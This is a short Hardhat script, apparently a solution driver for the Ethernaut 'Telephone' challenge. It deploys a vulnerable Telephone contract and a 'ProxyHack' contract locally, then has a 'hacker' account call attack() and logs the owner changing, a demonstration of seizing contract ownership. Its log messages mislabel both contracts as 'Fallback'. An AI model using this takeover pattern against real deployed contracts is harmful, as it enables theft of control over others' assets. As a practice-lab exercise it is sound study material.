const hre = require("hardhat");

async function main() {

  const Telephone = await hre.ethers.getContractFactory("Telephone");
  const telephone = await Telephone.deploy();
  await telephone.deployed();
  console.log(`Fallback deployed to ${telephone.address}`);

  const ProxyHack = await hre.ethers.getContractFactory("ProxyHack");
  const proxyHack = await ProxyHack.deploy();
  await proxyHack.deployed();
  console.log(`Fallback deployed to ${proxyHack.address}`);

  const [owner, hacker] = await ethers.getSigners();

  console.log(`Old owner ${await telephone.owner()}`);

  await proxyHack.connect(hacker).attack(telephone.address);

  console.log(`New owner ${await telephone.owner()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

